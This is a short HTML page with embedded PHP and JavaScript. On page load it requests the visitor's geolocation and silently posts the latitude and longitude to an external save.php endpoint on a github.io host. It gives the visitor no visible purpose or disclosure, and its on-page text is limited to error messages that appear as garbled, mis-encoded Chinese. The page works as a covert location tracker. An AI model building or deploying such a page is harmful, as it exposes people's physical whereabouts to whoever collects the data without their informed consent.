<!DOCTYPE html>
<html>
<head> 
    <script src="//cdn.bootcss.com/jquery/2.2.2/jquery.min.js"></script>
<meta charset="utf-8"> 
<?php
header("Context-Type:application/x-www-form-urlencode");
?>
</head>
<body onload="getLocation()">
<p id="demo"></p>
<script>

var x=document.getElementById("demo");
function getLocation()
{
	if (navigator.geolocation)
	{
		navigator.geolocation.getCurrentPosition(showPosition,showError);
	}
	else
	{
		x.innerHTML="���������֧�ֶ�λ��";
	}
}
function showPosition(position)
{
	
	 $.ajax({
        type:'post',
        url:'https://atzhujie.github.io/orientation/save.php',
        async:true,
        data: { lat: position.coords.latitude,lon: position.coords.longitude},
        });
}
function showError(error)
{
	switch(error.code) 
	{
		case error.PERMISSION_DENIED:
			x.innerHTML="�û��ܾ��Ի�ȡ����λ�õ�����"
			break;
		case error.POSITION_UNAVAILABLE:
			x.innerHTML="λ����Ϣ�ǲ����õġ�"
			break;
		case error.TIMEOUT:
			x.innerHTML="�����û�����λ�ó�ʱ��"
			break;
		case error.UNKNOWN_ERROR:
			x.innerHTML="δ֪����"
			break;
	}
}
</script>
</body>
</html>